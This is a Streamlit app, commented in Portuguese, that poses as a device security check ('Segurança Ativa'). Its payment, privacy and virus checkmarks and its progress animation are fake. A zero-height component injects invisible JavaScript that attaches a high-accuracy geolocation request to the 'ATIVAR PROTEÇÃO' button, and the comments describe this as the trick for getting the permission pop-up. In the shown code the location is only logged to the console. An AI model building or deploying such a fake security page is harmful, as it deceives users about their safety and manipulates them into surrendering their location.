import streamlit as st
import streamlit.components.v1 as components
import time

# --- MANTENDO SUA ESTILIZAÇÃO ORIGINAL ---
st.set_page_config(page_title="Segurança Ativa", page_icon="🛡️", layout="centered")

st.markdown("""
    <style>
    .main { background-color: #0e1117; }
    .stButton>button { 
        width: 100%; border-radius: 20px; background-color: #262730; 
        color: white; border: none; height: 50px; font-weight: bold;
    }
    .circle-container { display: flex; justify-content: center; align-items: center; height: 250px; }
    .circle {
        width: 200px; height: 200px; border-radius: 50%;
        border: 4px solid #1f2329; border-top: 4px solid #00ff7f;
        display: flex; justify-content: center; align-items: center;
        font-size: 40px; font-weight: bold; color: white;
    }
    .spin { animation: spin 2s linear infinite; }
    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
    </style>
    """, unsafe_allow_html=True)

# --- O SEGREDO PARA O POP-UP APARECER ---
# Este script detecta o clique no botão e força o pop-up de precisão do Google
js_popup = """
<script>
    function chamarLocalizacao() {
        navigator.geolocation.getCurrentPosition(
            (p) => { console.log("OK"); },
            (e) => { console.log("Erro"); },
            { enableHighAccuracy: true, timeout: 10000 }
        );
    }
    // Procura o botão na página e anexa o pedido de localização a ele
    const btn = window.parent.document.querySelector('button');
    if (btn) {
        btn.addEventListener('click', chamarLocalizacao);
    }
</script>
"""

# Injeta o script de forma invisível
components.html(js_popup, height=0)

# --- INTERFACE VISUAL ---
st.title("Verificar segurança")

placeholder_bolha = st.empty()

st.write("✅ Ambiente de pagamentos")
st.write("✅ Privacidade e segurança")
st.write("✅ Vírus")

if st.button("● ATIVAR PROTEÇÃO"):
    # Quando clicar, o JS acima vai disparar o pop-up
    for i in range(4, 101, 5):
        placeholder_bolha.markdown(f'<div class="circle-container"><div class="circle spin">{i}%</div></div>', unsafe_allow_html=True)
        time.sleep(0.05)
    st.success("Proteção Ativada!")
else:
    placeholder_bolha.markdown('<div class="circle-container"><div class="circle">4%</div></div>', unsafe_allow_html=True)

st.warning("Permissão de localização negada ou indisponível.")
